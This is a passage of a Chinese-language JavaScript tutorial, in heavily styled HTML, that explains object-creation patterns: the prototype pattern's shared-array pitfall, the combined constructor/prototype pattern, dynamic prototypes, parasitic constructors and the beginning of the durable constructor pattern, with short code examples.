&nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){\n &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;}\n}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();\nperson1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"乾隆\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"康熙\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"嬴政\"</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"bu\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"乾隆\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"康熙\"</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"function\"</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"wei\"</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">\"嬴政\"</span>);\nperson1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;\n &nbsp; &nbsp;<br>&nbsp; o.job = job;\n &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);\n &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;\n}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"wei\"</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"banzhuan\"</span>);\nperson.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//\"wei\"</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span>\n &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"|\"</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"red\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"blue\"</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">\"green\"</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"> &nbsp; &nbsp;<br> &nbsp; &nbsp;//创建要返回的新对象</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp; <br>&nbsp; &nbsp;var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span 